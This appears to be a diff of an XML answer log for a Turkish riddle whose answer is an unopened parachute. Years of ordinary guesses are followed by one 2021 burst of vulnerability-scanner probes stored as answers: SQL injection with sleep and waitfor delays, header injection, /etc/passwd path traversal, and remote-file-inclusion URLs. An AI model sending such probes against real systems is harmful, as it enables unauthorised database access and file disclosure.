+  </CEVAP>
+  <CEVAP>
+    <Zaman>18.11.2014 Saat: 14.43</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>18.11.2014 Saat: 14.43</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>18.11.2014 Saat: 14.43</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kuran</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>18.11.2014 Saat: 14.44</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>18.11.2014 Saat: 14.44</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>para</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>14.12.2014 Saat: 11.05</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>l</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.01.2015 Saat: 7.59</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.01.2015 Saat: 17.03</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.01.2015 Saat: 8.53</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.01.2015 Saat: 8.54</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ip</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>28.04.2015 Saat: 3.43</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.05.2015 Saat: 3.08</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>22.05.2015 Saat: 12.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.05.2015 Saat: 10.46</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.05.2015 Saat: 10.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kürek</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.05.2015 Saat: 10.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ormanda 3 yol vardır kardeş: aslan tilki karga</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.05.2015 Saat: 10.49</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2015 Saat: 19.21</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>baltası</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.06.2015 Saat: 5.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.06.2015 Saat: 5.16</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2015 Saat: 4.38</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>zaten ölecek bir insan sırt çantası niye taşıyor ki boşu boşuna :)</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2015 Saat: 4.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yara bandı</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2015 Saat: 4.39</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2015 Saat: 4.41</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>eğer cevaplar kaydediliyorsa anlamadım bu cevabı hocam açılmayan paraşüt mü? </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2015 Saat: 9.36</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.09.2015 Saat: 6.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.09.2015 Saat: 6.51</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.10.2015 Saat: 14.25</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.11.2015 Saat: 9.38</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.11.2015 Saat: 9.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>İp</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.11.2015 Saat: 9.40</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Patika</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.11.2015 Saat: 9.42</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.11.2015 Saat: 9.43</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Patika</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.11.2015 Saat: 11.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>KEFEN</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.11.2015 Saat: 11.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>HİÇ BİR ŞEY</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.11.2015 Saat: 11.04</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>boş</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.11.2015 Saat: 11.05</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>10.11.2015 Saat: 11.06</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>çanta yok</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.01.2016 Saat: 8.30</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>17.01.2016 Saat: 8.30</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>07.03.2016 Saat: 7.21</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.05.2016 Saat: 21.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.05.2016 Saat: 21.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Kürek</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.05.2016 Saat: 21.18</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kürek</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.06.2016 Saat: 17.26</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kuran</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.06.2016 Saat: 17.27</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ölümsüzlük otu</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.06.2016 Saat: 17.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.06.2016 Saat: 17.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.06.2016 Saat: 17.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>iletki</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>03.06.2016 Saat: 17.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>gönye</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.02.2017 Saat: 1.32</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kitap</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>23.03.2017 Saat: 13.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kestirme</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>05.04.2017 Saat: 16.55</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>05.04.2017 Saat: 16.55</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>06.06.2017 Saat: 4.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>29.07.2017 Saat: 21.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>tabut</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>29.07.2017 Saat: 21.57</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>açılmayan paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.01.2018 Saat: 18.46</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>05.03.2018 Saat: 18.20</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Açılmayan paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>15.08.2018 Saat: 15.08</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>15.08.2018 Saat: 15.08</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>19.10.2018 Saat: 11.17</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.12.2018 Saat: 22.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ayna</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>08.12.2018 Saat: 22.54</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>09.12.2018 Saat: 23.44</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.02.2019 Saat: 12.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.02.2019 Saat: 12.56</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.02.2019 Saat: 12.56</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.03.2019 Saat: 21.34</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kağıda yazılmış bir not</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>01.03.2019 Saat: 21.35</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2019 Saat: 4.28</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2019 Saat: 4.28</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>tabanca</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2019 Saat: 4.29</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kamp</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2019 Saat: 4.29</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.05.2019 Saat: 4.30</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>saçma</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>20.10.2019 Saat: 1.02</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.12.2019 Saat: 20.41</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Açılmayan paraşüt!</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>16.03.2020 Saat: 14.36</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>16.03.2020 Saat: 14.36</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>açılmayan paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.03.2020 Saat: 2.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>,i</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>30.03.2020 Saat: 2.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ip</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.04.2020 Saat: 22.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.04.2020 Saat: 22.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.04.2020 Saat: 22.50</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>paraşüt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>cetvel</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>saat</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>fotoğraf makinesi</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.22</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>harita</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.04.2020 Saat: 22.24</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>13.08.2020 Saat: 7.57</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>ParaÅŸÃ¼t</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.10</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.10</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bÄ±Ã§ak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.10</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kÃ¶pek</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.10</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>eÅŸ</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.10</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>arkadaÅŸ</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.10</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kurt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kaÄŸÄ±t</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.11</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>et</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.12</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>aÄŸaÃ§</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.12</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>bitki</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yamur</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 5.13</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>nehir</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 16.20</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>hava</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 16.20</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 16.20</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 16.20</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>bomba</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>21.11.2020 Saat: 16.20</Zaman>
+    <Dogruluk>-1</Dogruluk>
+    <Metin>nem</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.11.2020 Saat: 9.50</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>BÄ±Ã§ak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.11.2020 Saat: 9.51</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Balta</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.11.2020 Saat: 9.51</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>BÄ±Ã§ak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.11.2020 Saat: 9.51</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Fermuar</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>26.11.2020 Saat: 9.52</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>BÄ±Ã§ak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>27.12.2020 Saat: 16.26</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>pusula</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yemek </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>su</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.48</Zaman>
+    <Dogruluk>0.1</Dogruluk>
+    <Metin>silah </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.48</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>mektup</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kefen</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kimlik</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.49</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>mezar taÅŸÄ±</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ip</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>kazma </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>tÄ±rmanÄ±ÅŸ baltasÄ±</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.50</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>halat</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>odun </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>yaprak</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>31.03.2021 Saat: 16.52</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>dal</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.35</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>
+ SomeCustomInjectedHeader:injected_by_wvs</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>QdFmO5ve</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1 OR 2+436-436-1=0+0+0+1 -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>
+ SomeCustomInjectedHeader:injected_by_wvs</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1 OR 2+951-951-1=0+0+0+1</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin> SomeCustomInjectedHeader:injected_by_wvs</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1' OR 2+359-359-1=0+0+0+1 -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>1</Dogruluk>
+    <Metin>Array</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1" OR 2+812-812-1=0+0+0+1 -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>)</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'"XOR(if(now()=sysdate(),sleep(9),0))OR"*/</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>Http://testasp.vulnweb.com/t/fit.txt</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>!(()&&!|*|*|</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>(select(0)from(select(sleep(9)))v)/*'+(select(0)from(select(sleep(9)))v)+'"+(select(0)from(select(sleep(9)))v)+"*/</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>http://testasp.vulnweb.com/t/fit.txt?.jpg</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1; waitfor delay '0:0:9' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>testasp.vulnweb.com</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1); waitfor delay '0:0:3' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>-1)); waitfor delay '0:0:3' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1 waitfor delay '0:0:3' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>T2mWG55Q'; waitfor delay '0:0:6' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>..À¯..À¯..À¯..À¯..À¯..À¯..À¯..À¯etc/passwd</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>1'"</Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>ARYkFfzZ'); waitfor delay '0:0:6' -- </Metin>
+  </CEVAP>
+  <CEVAP>
+    <Zaman>02.07.2021 Saat: 5.47</Zaman>
+    <Dogruluk>0</Dogruluk>
+    <Metin>\</Metin>
+  </CEVAP>
+  <CEVAP>
